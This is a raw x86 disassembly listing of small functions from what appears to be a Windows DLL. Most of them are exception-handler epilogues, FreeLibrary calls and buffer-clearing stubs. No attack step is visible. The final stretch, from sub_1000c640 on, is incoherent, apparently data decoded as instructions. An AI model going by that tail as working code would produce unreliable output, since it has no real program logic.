push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a4d1
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000a4da
push 0x8
push ebx
lea eax [ ebp - 0x38c ]
push eax
call sub_1000d316
sub_1000a60c
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000a7ba
cmp [ ebp - 0x50 ] ebx
je r-xdata
retn
push [ ebp - 0x50 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x50 ] ebx
sub_1000a891
push 0x1
pop eax
retn
sub_1000a8b5
push 0x1
pop eax
retn
sub_1000a8b9
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a92c
push 0x1
pop eax
retn
sub_1000a930
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a9ca
push 0x1
pop eax
retn
sub_1000aa4c
push 0x1
pop eax
retn
sub_1000ab4f
push 0x1
pop eax
retn
sub_1000ae29
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000ae32
push 0x8
push ebx
lea eax [ ebp - 0x38c ]
push eax
call sub_1000d316
sub_1000af0c
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000b0ba
cmp [ ebp - 0x50 ] ebx
je r-xdata
retn
push [ ebp - 0x50 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x50 ] ebx
sub_1000b191
push 0x1
pop eax
retn
sub_1000b1b5
push 0x1
pop eax
retn
sub_1000b1b9
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b22c
push 0x1
pop eax
retn
sub_1000b230
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b2ca
push 0x1
pop eax
retn
sub_1000b34c
push 0x1
pop eax
retn
sub_1000b44f
push 0x1
pop eax
retn
sub_1000b588
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000b591
push 0x8
lea eax [ ebp - 0x10 ]
push ebx
push eax
call sub_1000d316
sub_1000b61b
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000b71d
push 0x1
pop eax
retn
sub_1000b721
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b968
push 0x10
push ebx
push edi
call sub_1000d316
sub_1000b971
push 0x8
push ebx
lea eax [ ebp - 0x2ec ]
push eax
call sub_1000d316
sub_1000ba4d
push 0x10
push ebx
push esi
call sub_1000d316
sub_1000bbf8
cmp [ ebp - 0x54 ] ebx
je r-xdata
retn
push [ ebp - 0x54 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x54 ] ebx
sub_1000bc8b
push 0x1
pop eax
retn
sub_1000bc8f
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd02
push 0x1
pop eax
retn
sub_1000bd06
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd7c
push 0x1
pop eax
retn
sub_1000bdfe
push 0x1
pop eax
retn
sub_1000be67
push ebp
mov ebp esp
sub esp 0x14
push 0x14
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_1000d316
sub_1000bfb0
push [ ebp - 0x1c ]
call [ FreeLibrary@IAT ]
retn
sub_1000c492
sub_1000c640
dec ebp
cmp dl bl
jmp sub_1000c5ec
sub_1000c932
retn 0x18da
sub_1000cbe0
xchg edi eax
push ds
jle r-xdata
mov [ eax - 0x5ac2355d ] edi
add [ esi + 0x78 ] edi
movsb [ edi ] [ esi ]
out 0x5c eax
dec esp
stosb [ edi ]
pop ecx
0x922f
sub_1000d310
push cs
0x1245
sub_1000d316
mov dh [ edi + 0x6a1ec645 ]
sub_1000d31c
salc
add bp [ ecx - 0x58 ]
xchg esi eax
mov al 0x94
adc [ ebp + 0x47d0beef ] al
push ecx
and bl [ esi ]
das
inc ebx
push cs
sub_1000d330
add esp [ ebp - 0x5c ]
push esp
scasb [ edi ]
hlt
sub_1000d360
cmpsb [ esi ] [ edi ]
int 0xd4
mov edx 0x88158c45
jmp 0x38797ab1
sub_1000d4b8
xor eax 0xbd81a8fa
push esp
